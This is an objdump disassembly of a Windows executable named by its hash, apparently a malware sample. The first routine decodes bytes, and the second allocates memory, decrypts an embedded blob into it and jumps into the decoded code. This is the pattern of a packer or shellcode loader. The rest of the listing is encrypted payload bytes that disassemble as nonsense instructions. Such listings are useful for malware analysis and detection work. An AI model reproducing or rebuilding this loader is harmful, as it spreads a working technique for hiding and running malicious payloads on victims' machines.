
cd536584b41bdd8038ccfcd0751512a2811d0d9e72ef37a1f3fcbeb1f0295bad.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0x8
  411003:	push   ebx
  411004:	push   ebp
  411005:	mov    ebp,DWORD PTR [esp+0x20]
  411009:	push   esi
  41100a:	xor    eax,eax
  41100c:	push   edi
  41100d:	mov    edi,DWORD PTR [esp+0x1c]
  411011:	mov    DWORD PTR [esp+0x10],eax
  411015:	mov    esi,0xfffffffd
  41101a:	mov    DWORD PTR [esp+0x14],0x1
  411022:	mov    ecx,DWORD PTR [esp+0x20]
  411026:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41102a:	add    esi,0x2
  41102d:	inc    esi
  41102e:	mov    BYTE PTR [esi+edi*1],cl
  411031:	movzx  ecx,BYTE PTR [eax+ebp*1]
  411035:	mov    edx,DWORD PTR [esp+0x10]
  411039:	mov    eax,DWORD PTR [esp+0x14]
  41103d:	add    edx,eax
  41103f:	mov    DWORD PTR [esp+0x10],edx
  411043:	ror    eax,cl
  411045:	mov    eax,DWORD PTR [esp+0x10]
  411049:	mov    edx,eax
  41104b:	shr    edx,0x3
  41104e:	mov    ebx,0x1
  411053:	sub    ebx,edx
  411055:	imul   eax,ebx
  411058:	mov    DWORD PTR [esp+0x10],eax
  41105c:	shl    ebx,0x3
  41105f:	mov    bl,BYTE PTR [esi+edi*1]
  411062:	add    bl,cl
  411064:	mov    ecx,DWORD PTR [esp+0x24]
  411068:	mov    BYTE PTR [esi+edi*1],bl
  41106b:	sub    esi,0x2
  41106e:	cmp    esi,ecx
  411070:	jl     0x411022
  411072:	pop    edi
  411073:	pop    esi
  411074:	pop    ebp
  411075:	pop    ebx
  411076:	add    esp,0x8
  411079:	ret    
  41107a:	nop
  41107b:	nop
  41107c:	nop
  41107d:	nop
  41107e:	nop
  41107f:	nop
  411080:	push   ebp
  411081:	mov    ebp,esp
  411083:	sub    esp,0x70
  411086:	mov    DWORD PTR [ebp-0x8],0x0
  41108d:	mov    DWORD PTR [ebp-0x70],0x0
  411094:	mov    DWORD PTR [ebp-0x58],0x0
  41109b:	mov    DWORD PTR [ebp-0x5c],0x0
  4110a2:	mov    DWORD PTR [ebp-0x48],0x0
  4110a9:	mov    DWORD PTR [ebp-0x6c],0x0
  4110b0:	mov    DWORD PTR [ebp-0x68],0x0
  4110b7:	mov    DWORD PTR [ebp-0x10],0x0
  4110be:	mov    DWORD PTR [ebp-0x60],0x0
  4110c5:	mov    DWORD PTR [ebp-0x18],0x0
  4110cc:	mov    DWORD PTR [ebp-0xc],0x0
  4110d3:	mov    DWORD PTR [ebp-0x30],0x0
  4110da:	mov    DWORD PTR [ebp-0x2c],0x0
  4110e1:	mov    DWORD PTR [ebp-0x14],0x0
  4110e8:	mov    DWORD PTR [ebp-0x4],0x0
  4110ef:	mov    DWORD PTR [ebp-0x54],0x0
  4110f6:	mov    DWORD PTR [ebp-0x50],0x0
  4110fd:	mov    DWORD PTR [ebp-0x4c],0x0
  411104:	mov    eax,ds:0x429160
  411109:	mov    DWORD PTR [ebp-0x28],eax
  41110c:	mov    ecx,DWORD PTR ds:0x429164
  411112:	mov    DWORD PTR [ebp-0x24],ecx
  411115:	mov    edx,DWORD PTR ds:0x429168
  41111b:	mov    DWORD PTR [ebp-0x20],edx
  41111e:	mov    al,ds:0x42916c
  411123:	mov    BYTE PTR [ebp-0x1c],al
  411126:	mov    ecx,DWORD PTR ds:0x429150
  41112c:	mov    DWORD PTR [ebp-0x40],ecx
  41112f:	mov    edx,DWORD PTR ds:0x429154
  411135:	mov    DWORD PTR [ebp-0x3c],edx
  411138:	mov    eax,ds:0x429158
  41113d:	mov    DWORD PTR [ebp-0x38],eax
  411140:	mov    cx,WORD PTR ds:0x42915c
  411147:	mov    WORD PTR [ebp-0x34],cx
  41114b:	mov    dl,BYTE PTR ds:0x42915e
  411151:	mov    BYTE PTR [ebp-0x32],dl
  411154:	mov    DWORD PTR [ebp-0x2c],0x40
  41115b:	call   DWORD PTR ds:0x42901c
  411161:	mov    eax,DWORD PTR [ebp-0x70]
  411164:	push   eax
  411165:	call   DWORD PTR ds:0x429018
  41116b:	lea    ecx,[ebp-0x10]
  41116e:	push   ecx
  41116f:	lea    edx,[ebp-0x18]
  411172:	push   edx
  411173:	call   DWORD PTR ds:0x429000
  411179:	test   eax,eax
  41117b:	jne    0x4111a5
  41117d:	push   0x0
  41117f:	push   0x14
  411181:	push   0x14
  411183:	push   0xa
  411185:	push   0xa
  411187:	push   0x0
  411189:	push   0x0
  41118b:	push   0x14
  41118d:	push   0x14
  41118f:	push   0xa
  411191:	push   0xa
  411193:	push   0x0
  411195:	push   0x0
  411197:	call   0x424352
  41119c:	mov    eax,DWORD PTR [ebp-0x10]
  41119f:	add    eax,0x1
  4111a2:	mov    DWORD PTR [ebp-0x10],eax
  4111a5:	mov    BYTE PTR [ebp-0x40],0x56
  4111a9:	call   DWORD PTR ds:0x429034
  4111af:	mov    DWORD PTR [ebp-0x30],eax
  4111b2:	mov    BYTE PTR [ebp-0x3e],0x72
  4111b6:	movzx  ecx,WORD PTR [ebp-0x30]
  4111ba:	test   ecx,ecx
  4111bc:	jne    0x411210
  4111be:	mov    BYTE PTR [ebp-0x34],0x0
  4111c2:	mov    DWORD PTR [ebp-0x18],0xe0d
  4111c9:	lea    edx,[ebp-0x28]
  4111cc:	push   edx
  4111cd:	call   DWORD PTR ds:0x429044
  4111d3:	mov    DWORD PTR [ebp-0x60],eax
  4111d6:	mov    DWORD PTR [ebp-0x50],0x3a
  4111dd:	lea    eax,[ebp-0x40]
  4111e0:	push   eax
  4111e1:	mov    ecx,DWORD PTR [ebp-0x60]
  4111e4:	push   ecx
  4111e5:	call   DWORD PTR ds:0x429048
  4111eb:	mov    DWORD PTR [ebp-0x44],eax
  4111ee:	mov    DWORD PTR [ebp-0x4],0x7483e69f
  4111f5:	push   0x0
  4111f7:	push   0x14
  4111f9:	push   0x14
  4111fb:	push   0xa
  4111fd:	push   0xa
  4111ff:	push   0x0
  411201:	call   DWORD PTR ds:0x42900c
  411207:	mov    DWORD PTR [ebp-0x6c],0x10ebff
  41120e:	jmp    0x411225
  411210:	mov    BYTE PTR ds:0x447ac8,0x0
  411217:	mov    BYTE PTR ds:0x42d6a0,0x0
  41121e:	mov    BYTE PTR ds:0x443dd8,0x0
  411225:	push   0x0
  411227:	call   DWORD PTR ds:0x429140
  41122d:	push   DWORD PTR ds:0x429044
  411233:	pop    edx
  411234:	mov    DWORD PTR [ebp-0x68],edx
  411237:	mov    edx,DWORD PTR [ebp-0x70]
  41123a:	push   edx
  41123b:	call   DWORD PTR ds:0x429050
  411241:	mov    DWORD PTR [ebp-0x30],0x410000
  411248:	push   DWORD PTR [ebp-0x2c]
  41124b:	push   0x1000
  411250:	mov    eax,DWORD PTR [ebp-0x18]
  411253:	add    eax,0x23
  411256:	add    eax,0x23
  411259:	push   eax
  41125a:	xor    eax,eax
  41125c:	push   eax
  41125d:	mov    ecx,DWORD PTR [ebp-0x44]
  411260:	call   ecx
  411262:	mov    edx,eax
  411264:	mov    DWORD PTR [ebp-0x8],edx
  411267:	mov    eax,DWORD PTR [ebp-0x6c]
  41126a:	sub    eax,0xdae0b
  41126f:	mov    DWORD PTR [ebp-0x6c],eax
  411272:	cmp    DWORD PTR [ebp-0x8],0x0
  411276:	jne    0x411286
  411278:	push   0x0
  41127a:	call   0x42434c
  41127f:	mov    BYTE PTR ds:0x443dd8,0x0
  411286:	mov    ecx,DWORD PTR [ebp-0x8]
  411289:	add    ecx,DWORD PTR [ebp-0x18]
  41128c:	mov    edx,DWORD PTR [ebp-0x4]
  41128f:	mov    DWORD PTR [ecx],edx
  411291:	mov    eax,DWORD PTR [ebp-0x8]
  411294:	add    eax,DWORD PTR [ebp-0x50]
  411297:	mov    DWORD PTR [ebp-0x5c],eax
  41129a:	mov    ecx,DWORD PTR ds:0x429048
  4112a0:	mov    DWORD PTR [ebp-0x4c],ecx
  4112a3:	mov    edx,DWORD PTR [ebp-0x8]
  4112a6:	add    edx,DWORD PTR [ebp-0x18]
  4112a9:	mov    eax,DWORD PTR [ebp+0x8]
  4112ac:	mov    DWORD PTR [edx+0x4],eax
  4112af:	mov    ecx,DWORD PTR [ebp-0x8]
  4112b2:	add    ecx,DWORD PTR [ebp-0x18]
  4112b5:	mov    DWORD PTR [ebp-0xc],ecx
  4112b8:	push   0x8000
  4112bd:	push   0x0
  4112bf:	mov    edx,DWORD PTR [ebp-0x70]
  4112c2:	push   edx
  4112c3:	call   DWORD PTR ds:0x42904c
  4112c9:	cmp    DWORD PTR [ebp-0x6c],0x0
  4112cd:	jbe    0x4112ea
  4112cf:	mov    eax,DWORD PTR [ebp-0xc]
  4112d2:	push   eax
  4112d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4112d6:	push   ecx
  4112d7:	mov    edx,DWORD PTR [ebp-0x30]
  4112da:	add    edx,DWORD PTR [ebp-0x6c]
  4112dd:	push   edx
  4112de:	mov    eax,DWORD PTR [ebp-0x8]
  4112e1:	push   eax
  4112e2:	call   0x411000
  4112e7:	add    esp,0x10
  4112ea:	mov    ecx,DWORD PTR [ebp-0x70]
  4112ed:	push   ecx
  4112ee:	call   DWORD PTR ds:0x429144
  4112f4:	cmp    DWORD PTR [ebp-0x5c],0x0
  4112f8:	je     0x41130b
  4112fa:	push   DWORD PTR [ebp-0x4c]
  4112fd:	push   DWORD PTR [ebp-0x68]
  411300:	mov    edx,DWORD PTR [ebp-0x5c]
  411303:	push   eax
  411304:	jmp    edx
  411306:	jmp    0x422dee
  41130b:	mov    edx,DWORD PTR [ebp+0x8]
  41130e:	mov    DWORD PTR [ebp-0x14],edx
  411311:	push   0x0
  411313:	push   0x1
  411315:	mov    eax,DWORD PTR [ebp-0x60]
  411318:	push   eax
  411319:	call   DWORD PTR ds:0x429058
  41131f:	fidiv  DWORD PTR [ebp+0x70]
  411322:	mov    dl,0xc5
  411324:	jns    0x4112ae
  411326:	stos   BYTE PTR es:[edi],al
  411327:	ret    
  411328:	push   ds
  411329:	(bad)  
  41132a:	mov    ds:0x79bd5dd5,eax
  41132f:	dec    ecx
  411330:	xchg   esp,eax
  411331:	add    esi,DWORD PTR [eax+0x31]
  411334:	jmp    0x50e9824d
  411339:	(bad)  
  41133a:	sti    
  41133b:	mov    ds:0x6dc26cc6,eax
  411340:	icebp  
  411341:	xchg   ecx,eax
  411342:	mov    cl,0xeb
  411344:	cmp    DWORD PTR [edi+0x658a8a19],ebp
  41134a:	push   0xeef60a95
  41134f:	rol    edx,0xcb
  411352:	cmc    
  411353:	in     eax,dx
  411354:	xlat   BYTE PTR ds:[ebx]
  411355:	shr    DWORD PTR [edx],0x6a
  411358:	arpl   bx,dx
  41135a:	inc    esp
  41135b:	dec    edi
  41135c:	and    ah,dh
  41135e:	push   ebp
  41135f:	jo     0x411346
  411361:	pop    ss
  411362:	nop
  411363:	adc    bl,BYTE PTR [ebx+0x11464c84]
  411369:	and    ah,dl
  41136b:	mov    eax,0xc37f718a
  411370:	hlt    
  411371:	gs mov bl,ch
  411374:	neg    BYTE PTR [ebx-0x13]
  411377:	outs   dx,BYTE PTR ds:[esi]
  411378:	push   ebp
  411379:	pop    esp
  41137a:	(bad)  
  41137b:	mov    edi,0xfc2aa918
  411380:	(bad)  
  411381:	out    0x11,al
  411383:	iret   
  411384:	call   0x228b1e74
  411389:	sub    dh,bh
  41138b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41138c:	mov    ebp,0xca09b1be
  411391:	imul   edx,DWORD PTR [esi+0x61],0x5cd51870
  411398:	in     eax,0x2a
  41139a:	inc    ebx
  41139b:	lods   eax,DWORD PTR ds:[esi]
  41139c:	lods   eax,DWORD PTR ds:[esi]
  41139d:	cmp    esp,DWORD PTR [ebx-0x2caad54e]
  4113a3:	les    ebx,FWORD PTR ds:0xc97ee16a
  4113a9:	mov    esi,ebp
  4113ab:	ds and ch,0x81
  4113af:	and    BYTE PTR [eax-0x19],0x79
  4113b3:	jno    0x411415
  4113b5:	mov    eax,ds:0x6c9e88d3
  4113ba:	dec    ebp
  4113bb:	and    bh,BYTE PTR [ebx-0x4ebcfc9a]
  4113c1:	pop    ecx
  4113c2:	aaa    
  4113c3:	or     DWORD PTR [edi],ecx
  4113c5:	xchg   ebp,eax
  4113c6:	mov    edx,0xdb544fb4
  4113cb:	pop    eax
  4113cc:	sbb    DWORD PTR [ebp+edi*1-0x4d0119e1],edx
  4113d3:	loop   0x41140f
  4113d5:	cld    
  4113d6:	mov    al,0x8a
  4113d8:	fidivr WORD PTR [ecx+0x2de80608]
  4113de:	mov    dl,0x9b
  4113e0:	(bad)  
  4113e1:	xlat   BYTE PTR ds:[ebx]
  4113e2:	cmp    DWORD PTR [eax+ecx*2],0x6bad3233
  4113e9:	add    BYTE PTR [eax+0x12],al
  4113ec:	or     ah,BYTE PTR [edi+0x6]
  4113ef:	stos   DWORD PTR es:[edi],eax
  4113f0:	add    ah,BYTE PTR [eax-0x2a390181]
  4113f6:	ret    0x8b3
  4113f9:	mov    eax,0xf1174f30
  4113fe:	mov    al,0x52
  411400:	cmp    BYTE PTR [eax],0xcd
  411403:	sbb    dl,BYTE PTR [ecx+0x6fd34161]
  411409:	sbb    DWORD PTR [esi+0x2d],esi
  41140c:	xor    BYTE PTR [esi+ecx*8+0xe],bl
  411410:	and    eax,0xc796f39d
  411415:	inc    esp
  411416:	lods   al,BYTE PTR ss:[esi]
  411418:	push   eax
  411419:	push   edx
  41141a:	mov    ch,0xd6
  41141c:	shl    BYTE PTR [esi],1
  41141e:	adc    eax,0xa8bb4fa8
  411423:	test   ch,0xfe
  411426:	adc    al,0x6d
  411428:	adc    al,0x2a
  41142a:	lods   eax,DWORD PTR ds:[esi]
  41142b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41142c:	shl    dh,1
  41142e:	jae    0x41147d
  411430:	jle    0x4113f3
  411432:	mov    gs,WORD PTR [edi-0x46]
  411435:	dec    edx
  411436:	repnz cli 
  411438:	cwde   
  411439:	les    ecx,FWORD PTR [ecx]
  41143b:	xor    al,BYTE PTR [ebp-0x46]
  41143e:	xor    DWORD PTR [edi-0x61977f08],ebx
  411444:	mov    eax,0xb0f392f
  411449:	cmc    
  41144a:	mov    al,ds:0x9573b3c0
  41144f:	hlt    
  411450:	in     eax,0x45
  411452:	loop   0x4114ba
  411454:	push   edx
  411455:	xor    al,0xb
  411457:	xor    ch,BYTE PTR [esi-0x2]
  41145a:	adc    edi,edx
  41145c:	jmp    0xc45e47ae
  411461:	ds push ss
  411463:	fild   WORD PTR [edx+edx*4+0x35]
  411467:	out    dx,eax
  411468:	inc    esi
  411469:	xchg   ebx,eax
  41146a:	and    al,0x97
  41146c:	std    
  41146d:	sub    al,0xe2
  41146f:	xchg   ebp,eax
  411470:	jbe    0x4114bc
  411472:	add    BYTE PTR [edx],dl
  411474:	inc    edx
  411475:	inc    edi
  411476:	sbb    al,0x3
  411478:	(bad)  
  411479:	xchg   edi,eax
  41147a:	test   DWORD PTR [edx+ebx*4+0x4fe4755],0x8c18180f
  411485:	retfw  0x8de5
  411489:	push   ds
  41148a:	sar    ch,1
  41148c:	test   DWORD PTR [esi-0xd99bcc3],0x65cdad8a
  411496:	stos   DWORD PTR es:[edi],eax
  411497:	stos   DWORD PTR es:[edi],eax
  411498:	test   eax,0x30309eb3
  41149d:	mov    BYTE PTR [esi],0xc1
  4114a0:	repnz sbb ecx,DWORD PTR [eax-0x5b]
  4114a4:	inc    esi
  4114a5:	retf   0x8b9
  4114a8:	(bad)  
  4114a9:	cdq    
  4114aa:	pop    ecx
  4114ab:	(bad)  
  4114ac:	cdq    
  4114ad:	lahf   
  4114ae:	push   edx
  4114af:	jne    0x41150f
  4114b1:	stos   DWORD PTR es:[edi],eax
  4114b2:	sbb    edi,0xca01ab3e
  4114b8:	ins    BYTE PTR es:[edi],dx
  4114b9:	lods   al,BYTE PTR ds:[esi]
  4114ba:	in     al,dx
  4114bb:	ins    BYTE PTR es:[edi],dx
  4114bc:	push   ecx
  4114bd:	cmp    ebp,DWORD PTR [edi-0x68a37067]
  4114c3:	mov    al,ds:0x83b6ae20
  4114c8:	inc    eax
  4114c9:	in     al,dx
  4114ca:	push   es
  4114cb:	jle    0x4114e1
  4114cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ce:	sbb    DWORD PTR ds:0x63b16da3,ebp
  4114d4:	or     ebp,esp
  4114d6:	mov    bh,0x4b
  4114d8:	mov    bh,0x72
  4114da:	push   cs
  4114db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114dc:	push   ds
  4114dd:	arpl   WORD PTR [esi+0x29],ax
  4114e0:	mov    bl,0xde
  4114e2:	(bad)  
  4114e3:	retf   
  4114e4:	or     al,0xe6
  4114e6:	pop    ss
  4114e7:	or     BYTE PTR [eax],dh
  4114e9:	retf   
  4114ea:	fsubr  DWORD PTR [eax]
  4114ec:	or     DWORD PTR [esi-0x2],ebx
  4114ef:	mov    eax,0x90186bb
  4114f4:	in     al,dx
  4114f5:	imul   edi,DWORD PTR [edx+0x4992df27],0xe2981530
  4114ff:	mov    cl,0x4f
  411501:	aas    
  411502:	push   ebp
  411503:	dec    edx
  411504:	xchg   ebx,eax
  411505:	sub    al,0x91
  411507:	mov    al,ds:0x58da9c57
  41150c:	xlat   BYTE PTR ds:[ebx]
  41150d:	retf   
  41150e:	ret    
  41150f:	stos   BYTE PTR es:[edi],al
  411510:	xchg   esp,eax
  411511:	xor    al,0x34
  411513:	stos   DWORD PTR es:[edi],eax
  411514:	or     al,bh
  411516:	pop    ds
  411517:	push   ecx
  411518:	adc    eax,0xbfd60e86
  41151d:	pusha  
  41151e:	cmp    DWORD PTR [eax],edx
  411520:	xor    eax,0x2bcb70e3
  411525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411526:	int3   
  411527:	push   edi
  411528:	fs xor al,ah
  41152b:	xor    BYTE PTR [ebp+0x16],bh
  41152e:	push   esp
  41152f:	sbb    DWORD PTR [eax],eax
  411531:	fisttp DWORD PTR [ebx+0x36]
  411534:	gs test al,0xf3
  411537:	popf   
  411538:	ss mov DWORD PTR cs:[ebx],ebx
  41153c:	push   es
  41153d:	jae    0x411574
  41153f:	or     BYTE PTR [ebp+0x4a],dh
  411542:	or     esi,DWORD PTR [esi+0x6a88669a]
  411548:	fbstp  TBYTE PTR [esi]
  41154a:	test   ebp,esp
  41154c:	dec    ebx
  41154d:	popf   
  41154e:	shr    BYTE PTR [ebp-0x537de815],cl
  411554:	push   es
  411555:	(bad)  
  411556:	outs   dx,BYTE PTR ds:[esi]
  411557:	jmp    0xa3cd:0x84508011
  41155e:	push   ds
  41155f:	and    DWORD PTR [esi],ebx
  411561:	mov    eax,ds:0xe247036a
  411566:	sub    BYTE PTR [esi+0x5f],ah
  411569:	mov    WORD PTR [esi+edx*8-0x16],ss
  41156d:	out    dx,al
  41156e:	push   cs
  41156f:	call   FWORD PTR [ebx-0x59]
  411572:	mul    DWORD PTR [ebx-0x683957e8]
  411578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411579:	xchg   edi,eax
  41157a:	or     BYTE PTR [ebx+0x3a],bh
  41157d:	data16 mov bh,0x51
  411580:	or     bl,BYTE PTR [eax]
  411582:	imul   esi,DWORD PTR [ebp-0x280d8fd1],0x19aa5b8a
  41158c:	(bad)  [esi]
  41158e:	lds    ebp,FWORD PTR [esi-0x5d]
  411591:	in     eax,dx
  411592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411593:	cs repnz inc edi
  411596:	push   esi
  411597:	fwait
  411598:	add    ebp,DWORD PTR [edi]
  41159a:	cmp    al,0xae
  41159c:	aad    0x2c
  41159e:	aas    
  41159f:	adc    al,0xb4
  4115a1:	scas   eax,DWORD PTR es:[edi]
  4115a2:	push   ebx
  4115a3:	and    al,0xf9
  4115a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115a6:	or     al,0xa
  4115a8:	xchg   edx,eax
  4115a9:	mov    cl,0x15
  4115ab:	sub    BYTE PTR [ebx+0x44],ch
  4115ae:	and    dh,dh
  4115b0:	xlat   BYTE PTR ds:[ebx]
  4115b1:	sbb    esp,ebp
  4115b3:	sbb    eax,0xb8e5b97
  4115b8:	(bad)  
  4115b9:	jle    0x411557
  4115bb:	scas   al,BYTE PTR es:[edi]
  4115bc:	fs jmp 0xbe2c:0x5da6a779
  4115c4:	xchg   BYTE PTR [esi],dh
  4115c6:	pusha  
  4115c7:	cmp    eax,0xc215bf99
  4115cc:	and    ah,ch
  4115ce:	xchg   BYTE PTR [edx+0x5d],bh
  4115d1:	mov    ds,WORD PTR [edx-0x24]
  4115d4:	push   edi
  4115d5:	je     0x41155d
  4115d7:	sub    al,0xe9
  4115d9:	mov    edi,0xf3572d85
  4115de:	aaa    
  4115df:	xchg   edi,eax
  4115e0:	ret    
  4115e1:	(bad)  
  4115e2:	enter  0xf13c,0x69
  4115e6:	cld    
  4115e7:	adc    ecx,ebx
  4115e9:	pushf  
  4115ea:	dec    edi
  4115eb:	jae    0x411575
  4115ed:	loopne 0x4115f1
  4115ef:	mov    bh,0xa6
  4115f1:	mov    cl,0xde
  4115f3:	cmp    eax,0x3ed582e3
  4115f8:	fst    DWORD PTR [esi]
  4115fa:	test   eax,0xfa96cfc5
  4115ff:	(bad)  
  411600:	sahf   
  411601:	int3   
  411602:	inc    eax
  411603:	xchg   edx,eax
  411604:	sbb    ecx,DWORD PTR [ecx]
  411606:	sar    BYTE PTR [edx+0x5b],1
  411609:	stos   DWORD PTR es:[edi],eax
  41160a:	imul   ebp,DWORD PTR [eax-0x5d599e3c],0xffffffa1
  411611:	arpl   WORD PTR [edx],dx
  411613:	cli    
  411614:	mov    ecx,0xa7ae5fed
  411619:	pop    ebp
  41161a:	cdq    
  41161b:	jmp    0x411689
  41161d:	cli    
  41161e:	xchg   esp,eax
  41161f:	popa   
  411620:	sahf   
  411621:	pop    ss
  411622:	sbb    BYTE PTR [esi-0x24],0xc2
  411626:	fld    QWORD PTR [ebp+ebp*8+0xb2ee903]
  41162d:	xlat   BYTE PTR ds:[ebx]
  41162e:	pop    esi
  41162f:	mov    esi,es
  411631:	das    
  411632:	jmp    0xca55:0xefea1b40
  411639:	sub    edi,DWORD PTR [ecx]
  41163b:	cmc    
  41163c:	test   eax,0x363980ca
  411641:	adc    BYTE PTR [ebx-0x34159fa7],al
  411647:	in     eax,0xa9
  411649:	in     eax,dx
  41164a:	xor    DWORD PTR [ecx],0xffffffd8
  41164d:	imul   edx,esp,0x0
  411650:	call   0x5db8:0x83ab882f
  411657:	mov    dh,0x4a
  411659:	mov    dl,0xb9
  41165b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41165c:	xchg   ecx,eax
  41165d:	dec    edi
  41165e:	cmp    DWORD PTR [eax],ecx
  411660:	pop    ecx
  411662:	pop    esi
  411663:	sub    DWORD PTR [edi-0x1e35b60d],0xfffffff6
  41166a:	mov    ebp,0x6699d096
  41166f:	pushf  
  411670:	fnsave [eax-0x4c]
  411673:	mov    al,0xcd
  411675:	ds std 
  411677:	inc    ecx
  411678:	jmp    0x4fd4e941
  41167d:	sub    BYTE PTR cs:[edx+eax*4],cl
  411681:	js     0x4116d2
  411683:	pop    esi
  411684:	pop    ebx
  411685:	cmp    dl,0xad
  411688:	in     al,dx
  411689:	push   ecx
  41168a:	and    cl,BYTE PTR [eax]
  41168c:	arpl   WORD PTR [edi-0x4ac342bb],cx
  411692:	pop    esp
  411693:	xchg   ebx,eax
  411694:	mul    DWORD PTR [edi]
  411696:	dec    esi
  411697:	out    dx,eax
  411698:	inc    DWORD PTR [ecx-0x12115d28]
  41169e:	fsubrp st(7),st
  4116a0:	nop
  4116a1:	scas   al,BYTE PTR es:[edi]
  4116a2:	xor    BYTE PTR [ebp+0x1b1a8b19],bl
  4116a8:	test   esi,0x82220256
  4116ae:	outs   dx,DWORD PTR ds:[esi]
  4116af:	out    0x20,eax
  4116b1:	jg     0x41164b
  4116b3:	enter  0xb295,0x42
  4116b7:	gs jecxz 0x4116c2
  4116ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116bb:	sahf   
  4116bc:	jmp    0xc7b7cc9c
  4116c1:	imul   DWORD PTR [ebx-0x41]
  4116c4:	clc    
  4116c5:	(bad)  [esp+ebp*2-0x38768290]
  4116cc:	lahf   
  4116cd:	std    
  4116ce:	xchg   edi,eax
  4116cf:	popa   
  4116d0:	fisubr WORD PTR [esi-0x4bda7006]
  4116d6:	pop    esp
  4116d7:	cmp    ecx,DWORD PTR [edi]
  4116d9:	add    DWORD PTR [ecx-0x5e],eax
  4116dc:	xchg   esi,eax
  4116dd:	mov    eax,ds:0xaa21953e
  4116e2:	retf   0xa48b
  4116e5:	cmc    
  4116e6:	ds js  0x411749
  4116e9:	mov    ds:0xda72f5d,eax
  4116ee:	mov    eax,0x9c4cc772
  4116f3:	push   edi
  4116f4:	add    al,0xd2
  4116f6:	xor    cl,cl
  4116f8:	mov    edx,0x56dee56a
  4116fd:	stos   BYTE PTR es:[edi],al
  4116fe:	mov    ebp,0x2bfbfe79
  411703:	pop    edi
  411704:	cs push ebp
  411706:	sar    DWORD PTR [eax-0x752dfb16],cl
  41170c:	jle    0x41169a
  41170e:	nop
  41170f:	pop    ds
  411710:	xor    BYTE PTR [eax],dh
  411712:	adc    BYTE PTR [ebx+0x37],dl
  411715:	add    eax,0x8c63b46c
  41171a:	daa    
  41171b:	imul   ecx,DWORD PTR [ecx+0x4],0xa8155f4a
  411722:	adc    dl,0xc0
  411725:	pop    esp
  411726:	(bad)  
  411727:	shl    dh,1
  411729:	push   esi
  41172a:	mov    al,ds:0xd118f4e
  41172f:	push   edi
  411730:	in     al,dx
  411731:	cmp    eax,0x4ccc8c71
  411736:	dec    esp
  411737:	jmp    0xcd67fed4
  41173c:	enter  0x8faf,0x96
  411740:	mov    dh,0x76
  411742:	and    esi,DWORD PTR [esi+esi*2+0x72]
  411746:	in     eax,dx
  411747:	push   ebp
  411748:	jbe    0x411727
  41174a:	cli    
  41174b:	popa   
  41174c:	or     al,0xb7
  41174e:	pusha  
  41174f:	sbb    DWORD PTR ds:0xa6726e5b,esi
  411755:	cmp    eax,0x6e9d94ca
  41175a:	or     eax,0xad07347b
  41175f:	cs cmp eax,0xf8bc5e7a
  411765:	push   ebp
  411766:	ins    BYTE PTR es:[edi],dx
  411767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411768:	rcl    bl,0xc9
  41176b:	sbb    DWORD PTR [ebp+esi*2-0x10],eax
  41176f:	cmp    DWORD PTR gs:[eax+0x25],ecx
  411773:	cli    
  411774:	and    ebp,ebp
  411776:	cld    
  411777:	not    dl
  411779:	cmp    al,0x59
  41177b:	dec    esp
  41177c:	mov    cl,0xb8
  41177e:	jp     0x411724
  411780:	mov    ch,0x4d
  411782:	outs   dx,DWORD PTR ds:[esi]
  411783:	xor    ebp,ebx
  411785:	adc    al,0xa6
  411787:	mov    ch,0xb4
  411789:	push   0xfffffff7
  41178b:	ret    0xe7d5
  41178e:	mov    ch,0x4a
  411790:	punpcklwd mm3,mm3
  411793:	adc    al,0xbb
  411795:	mov    ch,0x3c
  411797:	inc    esi
  411798:	call   0xa9f59ae0
  41179d:	jne    0x41174f
  41179f:	cmc    
  4117a0:	jb     0x41178d
  4117a2:	imul   ebp,DWORD PTR [eax+0x2a],0x3299906d
  4117a9:	push   DWORD PTR [edi-0x14]
  4117ac:	mov    al,ds:0x7756ae94
  4117b1:	sub    bh,bl
  4117b3:	inc    ebp
  4117b4:	(bad)  
  4117b5:	cwde   
  4117b6:	mov    eax,0x4cb303ef
  4117bb:	in     eax,0xea
  4117bd:	cmp    eax,0x19eb9927
  4117c2:	(bad)  
  4117c3:	dec    ebp
  4117c4:	add    al,0xf5
  4117c6:	pop    esp
  4117c7:	repz push ss
  4117c9:	ficom  DWORD PTR [edi]
  4117cb:	inc    ecx
  4117cc:	out    dx,al
  4117cd:	in     al,0xa7
  4117cf:	sahf   
  4117d0:	and    eax,0xe39faf6f
  4117d5:	adc    al,0x6b
  4117d7:	sbb    al,0x5b
  4117d9:	and    BYTE PTR [ebp+0x37887ff8],dh
  4117df:	shl    edx,cl
  4117e1:	repz ds jge 0x4117c0
  4117e5:	sub    ah,BYTE PTR [edx-0x272e9f33]
  4117eb:	clc    
  4117ec:	or     esi,ebx
  4117ee:	pop    edx
  4117ef:	xor    al,0x33
  4117f1:	fbld   TBYTE PTR [eax+0x44]
  4117f4:	cmp    eax,0x526aa30
  4117f9:	(bad)  [esi-0x75]
  4117fc:	or     dh,bl
  4117fe:	push   esi
  4117ff:	je     0x411880
  411801:	aas    
  411802:	xor    ebx,eax
  411804:	xchg   esp,eax
  411805:	jecxz  0x4117e9
  411807:	lods   eax,DWORD PTR ds:[esi]
  411808:	xor    BYTE PTR [ecx-0x3b],dh
  41180b:	cmp    DWORD PTR ds:[esi-0x43],ebp
  41180f:	jp     0x4117c1
  411811:	rsm    
  411813:	dec    esp
  411814:	push   0x478204a7
  411819:	sub    eax,0xed0db569
  41181e:	push   0xbd5181c3
  411823:	sub    al,0xb0
  411825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411826:	xor    al,0x88
  411828:	iret   
  411829:	icebp  
  41182a:	mul    dl
  41182c:	inc    ebx
  41182d:	and    BYTE PTR [edx-0x45],al
  411830:	dec    esi
  411831:	test   al,0x4a
  411833:	lds    ecx,FWORD PTR [eax-0x20]
  411836:	stc    
  411837:	sahf   
